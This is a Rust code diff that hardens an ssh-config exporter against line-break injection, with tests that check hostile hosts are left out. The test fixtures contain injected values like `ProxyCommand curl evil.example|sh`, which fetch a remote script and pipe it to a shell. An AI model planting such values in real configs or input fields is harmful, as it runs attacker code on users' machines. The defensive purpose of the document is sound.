@@ -691,16 +691,20 @@ pub fn export(
     identities: &HashMap<uuid::Uuid, crate::models::Identity>,
 ) -> String {
     use std::fmt::Write as _;
+    let user_of = |h: &crate::models::Host| h.identity_id.and_then(|i| identities.get(&i)).map(|i| i.username.trim().to_string());
+    // A name, address, group or user holding a line break would end its line here and start a new directive
+    // (`ProxyCommand ...`) that every later `ssh` to that host runs. Such a host is left out, with a note.
+    let (hosts, left_out): (Vec<_>, Vec<_>) = hosts.iter().partition(|(_, h)| h.check_text().is_ok() && user_of(h).is_none_or(|u| crate::models::check_line_text("", &u).is_ok()));
     // Aliases must be single words and unique.
     let mut alias_of: HashMap<uuid::Uuid, String> = HashMap::new();
     let mut used: std::collections::HashSet<String> = std::collections::HashSet::new();
-    for (id, h) in hosts {
+    for (id, h) in hosts.iter().copied() {
         let base: String = h
             .label
             .trim()
             .chars()
             .map(|c| {
-                if c.is_whitespace() || c == '*' || c == '?' || c == '!' {
+                if c.is_whitespace() || c.is_control() || c == '*' || c == '?' || c == '!' {
                     '-'
                 } else {
                     c
@@ -725,21 +729,20 @@ pub fn export(
         "# Exported from SSHVault. Private keys stay in the encrypted vault, so\n\
          # there are no IdentityFile lines: ssh uses your agent or default keys.\n",
     );
-    for (id, h) in hosts {
+    for (_, h) in left_out {
+        let _ = writeln!(out, "# Left out: {} (a name, address, group or user contains a control character)", h.label.escape_debug());
+    }
+    for (id, h) in hosts.iter().copied() {
         let _ = writeln!(out);
-        if !h.group.is_empty() {
-            let _ = writeln!(out, "# {}", h.group);
+        if !h.group.trim().is_empty() {
+            let _ = writeln!(out, "# {}", h.group.trim());
         }
         let _ = writeln!(out, "Host {}", alias_of[id]);
-        let _ = writeln!(out, "    HostName {}", h.hostname);
+        let _ = writeln!(out, "    HostName {}", h.hostname.trim());
         if h.port != 22 {
             let _ = writeln!(out, "    Port {}", h.port);
         }
-        if let Some(user) = h
-            .identity_id
-            .and_then(|i| identities.get(&i))
-            .map(|i| &i.username)
-        {
+        if let Some(user) = user_of(h) {
             let _ = writeln!(out, "    User {user}");
         }
         if let Some(j) = h.jump_host_id.and_then(|j| alias_of.get(&j)) {
@@ -1115,6 +1118,55 @@ Host *
         assert_eq!(w.proxy_jump.as_deref(), Some("bastion"));
         assert!(w.forward_agent);
         assert_eq!(get(&r, "bastion-2").hostname, "other.example.com");
+    }
+
+    #[test]
+    fn a_name_or_address_with_a_line_break_cannot_add_a_directive_to_the_export() {
+        use crate::models::{AuthMethod, Host, Identity};
+        let ident = uuid::Uuid::new_v4();
+        let host = |label: &str, hostname: &str, group: &str| Host { label: label.into(), hostname: hostname.into(), group: group.into(), identity_id: Some(ident), ..Default::default() };
+        let (good, evil_addr, evil_group, evil_label, evil_user) = (uuid::Uuid::new_v4(), uuid::Uuid::new_v4(), uuid::Uuid::new_v4(), uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
+        let user_ident = uuid::Uuid::new_v4();
+        let mut hostile_user = host("hu", "hu.example.com", "");
+        hostile_user.identity_id = Some(user_ident);
+        let hosts = vec![
+            (good, host("good", "good.example.com", "Prod")),
+            (evil_addr, host("a", "evil.example.com\n    ProxyCommand curl evil.example|sh", "")),
+            (evil_group, host("g", "g.example.com", "Prod\nHost *\n    ProxyCommand curl evil.example|sh")),
+            (evil_label, host("l\n    ProxyCommand curl evil.example|sh", "l.example.com", "")),
+            (evil_user, hostile_user),
+        ];
+        let ident_of = |name: &str| Identity { label: "i".into(), username: name.into(), auth: AuthMethod::Agent, notes: String::new(), for_host: None, totp: None };
+        let ids = HashMap::from([(ident, ident_of("ops")), (user_ident, ident_of("bob\n    ProxyCommand curl evil.example|sh"))]);
+        let text = export(&hosts, &ids);
+        for line in text.lines() {
+            assert!(!line.trim_start().starts_with("ProxyCommand"), "a directive was injected: {text}");
+            assert!(!line.trim_start().starts_with("Host *"), "a directive was injected: {text}");
+        }
+        assert!(text.contains("Host good\n    HostName good.example.com"), "{text}");
+        assert_eq!(text.matches("# Left out:").count(), 4, "{text}");
+        // What was written reads back as exactly the one safe host.
+        assert_eq!(parse(&text, Path::new("/h")).hosts.len(), 1);
+    }
+
+    #[test]
+    fn a_jump_to_a_host_that_was_left_out_is_not_written() {
+        use crate::models::Host;
+        let (a, b) = (uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
+        let bad = Host { label: "bad".into(), hostname: "x\nProxyCommand y".into(), ..Default::default() };
+        let web = Host { label: "web".into(), hostname: "web.example.com".into(), jump_host_id: Some(a), ..Default::default() };
+        let text = export(&[(a, bad), (b, web)], &HashMap::new());
+        assert!(!text.contains("ProxyJump"), "{text}");
+        assert!(text.contains("Host web"), "{text}");
+    }
+
+    #[test]
+    fn white_space_around_an_address_is_trimmed_not_refused() {
+        use crate::models::Host;
+        let a = uuid::Uuid::new_v4();
+        let h = Host { label: " pad ".into(), hostname: " pad.example.com\n".into(), ..Default::default() };
+        let text = export(&[(a, h)], &HashMap::new());
+        assert!(text.contains("Host pad\n    HostName pad.example.com\n"), "{text}");
     }
 
     #[test]
